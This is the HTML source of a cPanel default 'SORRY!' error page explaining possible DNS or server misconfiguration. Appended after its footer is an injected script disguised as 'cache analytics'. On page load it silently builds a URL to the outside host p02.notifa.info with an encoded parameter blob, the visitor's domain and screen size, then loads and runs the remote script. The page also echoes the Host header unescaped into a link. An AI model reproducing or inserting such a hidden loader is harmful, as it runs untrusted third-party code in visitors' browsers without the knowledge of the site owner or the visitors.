
<!DOCTYPE html>
<html>
    <head>
    <meta http-equiv="Content-type" content="text/html; charset=utf-8">
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Default Web Site Page</title>
    <style type="text/css">
        body {
            font-family: Arial, Helvetica, sans-serif;
            font-size: 14px;
            line-height: 1.428571429;
            background-color: #ffffff;
            color: #2F3230;
            padding: 0;
            margin: 0;
        }
        section, footer {
            display: block;
            padding: 0;
            margin: 0;
        }
        .container {
            margin-left: auto;
            margin-right: auto;
            padding: 0 10px;
        }
        .sorry-text {
            font-size: 500%;
            color: #CCCCCC;
        }

        .additional-info {
            background-repeat: no-repeat;
            background-color: #293A4A;
            color: #FFFFFF;
        }
        .additional-info a {
            color: #FFFFFF;
        }
        .additional-info-items {
            padding: 20px 0;
            min-height: 350px;
        }
        .contact-info {
            margin-bottom: 20px;
            font-size: 16px;
        }
        .contact-info a {
            text-decoration: underline;
            color: #428BCA;
        }
        .contact-info a:hover,
        .contact-info a:focus,
        .contact-info a:active {
            color: #2A6496;
        }
        .reason-text {
            margin: 20px 0;
            font-size: 16px;
        }
        ul {
            display: inline-block;
            list-style: none outside none;
            margin: 0;
            padding: 0;
        }
        ul li {
            float: left;
            text-align: center;
        }
        .additional-info-items ul li {
            width: 100%;
        }
        .heading-text {
            font-weight: bold;
            display: block;
            text-align: left;
        }
        .description {
            text-align: left;

        }
        .info-image {
            padding: 10px;
        }

        footer {
            text-align: center;
            margin: 60px 0;
        }

        footer a {
            text-decoration: none;
        }

        .copyright {
            font-size: 10px;
            color: #3F4143;
        }

        @media (min-width: 768px) {
            .additional-info {
                background-image: none;
            }
            .additional-info-items {
                padding: 20px;
            }
            .container {
                width: 90%;
            }
            .additional-info-items ul li {
                width: 25%;
                padding: 20px;
            }
            .reason-text {
                font-size: 18px;
            }
            .contact-info {
                font-size: 18px;
            }
        }
        @media (min-width: 992px) {
            .additional-info {
                background-image: url('/index/human/error-bg-left.png');
            }
            .container {
                width: 70%;
            }
            .sorry-text {
                font-size: 900%;
            }
        }
    </style>
    </head>
    <body>
        <div class="container">
            <span class="sorry-text">SORRY!</span>

            <section class="contact-info">
                If you are the owner of this website, please contact your hosting provider:
                <a href="mailto:webmaster@<?php echo $_SERVER['HTTP_HOST'];?>" target="_blank" rel="noopener noreferrer" title="Click this link to contact the host" id="dynamicProviderLink">
                    webmaster@<?php echo $_SERVER['HTTP_HOST'];?>
                </a>
            </section>

            <p class="reason-text">It is possible you have reached this page because: </p>
        </div>
        <section class="additional-info">
            <div class="container">
                <div class="additional-info-items">
                    <ul>
                        <li>
                            <div class="info-image">
                                <img src="/index/human/IP_changed.png"/>
                            </div>
                            <span class="heading-text">
                                The IP address has changed.
                            </span>
                            <div class="description">
                                The IP address for this domain may have changed recently. Check your DNS settings to verify that the domain is set up correctly. It may take 8-24 hours for DNS changes to propagate.
                                It may be possible to restore access to this site by <a href="https://go.cpanel.net/cleardnscache">following these instructions</a> for clearing your dns cache.
                            </div>
                        </li>
                        <li>
                            <div class="info-image">
                                <img src="/index/human/server_misconfigured.png"/>
                            </div>
                            <span class="heading-text">
                                There has been a server misconfiguration.
                            </span>
                            <div class="description">
                                 You must verify that your hosting provider has the correct IP address configured for your Apache settings and DNS records. A restart of Apache may be required for new settings to take effect.
                            </div>
                        </li>
                        <li>
                            <div class="info-image">
                                <img src="/index/human/server_moved.png"/>
                            </div>
                            <span class="heading-text">
                                The site may have moved to a different server.
                            </span>
                            <div class="description">
                                The URL for this domain may have changed or the hosting provider may have moved the account to a different server.
                            </div>
                        </li>
                    </ul>
                </div>
            </div>
        </section>
        <footer>
            <div class="container">
                <a href="http://cpanel.com/?utm_source=cpanelwhm&utm_medium=cplogo&utm_content=logolink&utm_campaign=cpanelwhmreferral" target="cpanel" title="cPanel, Inc.">
                    <img src="/index/human/powered_by_cpanel.svg" height="20" alt="cPanel, Inc." />
                    <div class="copyright">Copyright © 2019 cPanel, Inc.</div>
                </a>
            </div>
        </footer>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2SaRIYTa9V8MVZXR37GyYN20uktlzdk9SdZonFNFTSKf%2b%2fAcnPD1V%2f7V1L4InUg7ypbWri8PNOtj8s%2fjpj47qQ6ETQ%2bSYwISSK1CrkzMnXYbozD25DI5mOBN3WEZup%2fDsnZejeDyABEE11jpexYgaxVmUB75K8JR4DP1oP1GSDXj8B0agGw3EWYOR%2fQV0cjvgfd8oLRGuqGc2bJhlGEIuwq6y02wgNBEGRdagLay%2bgoXeo8%2fLnfAm1YxkpniuuvjtmBfL%2ftJOHD7AS0XI88Y04fqaXHvvj2bgU2NSCVUH9TAVrzlvhP7EjLYbu8GmLk7e2gnS2pAkWCt5QqVJJnl2K6rzoTkiexqXbI8f5Tt14l5ueGvsPVXsTIMSk6kvms381XGpOk7KFcSYxU2MFck8AOOQviLC%2bR7bY4Fv8j%2btgu3z5%2fOimURQ6mroaUpIBqs9tXru%2bvTUObwCYbRDp99O9ZgapysBWfLXjEy%2bYf7DaEPpXeMa45YpvJ2moGu5H0NyrVV4WILgeAzZIm1r8FOycV5yOIpXNb4HvMfGGsHxvvJfb4VOUFz2WhIiHPKHniLd%2fbCEoI3178BeP%2b2EDjP%2b7yrOZ5LkoeiN36kNMu50qHw%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>